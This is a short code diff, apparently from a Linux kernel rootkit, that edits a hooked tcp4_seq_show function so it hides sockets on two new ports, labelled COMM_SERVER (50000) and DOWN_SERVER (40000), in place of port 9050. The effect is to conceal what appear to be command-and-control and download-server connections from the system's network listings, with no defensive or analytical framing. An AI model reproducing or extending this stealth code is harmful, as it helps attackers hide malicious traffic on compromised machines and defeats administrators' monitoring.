@@ -10,6 +10,8 @@
 
 #define TMPSZ 150
 #define TCP_PINGPONG_THRESH 3
+#define COMM_SERVER 50000
+#define DOWN_SERVER 40000
 
 static inline bool our_inet_csk_in_pingpong_mode(struct sock *sk)
 {
@@ -160,7 +162,7 @@ static int hooked_tcp4_seq_show(struct seq_file *m, void *v)
 	inet = inet_sk((struct sock *) v);
 	port = ntohs(inet->inet_sport);
 
-	if (port == 9050)
+	if (port == COMM_SERVER || port == DOWN_SERVER)
 		return 0;
 
 	return original_tcp4_seq_show(m, v);
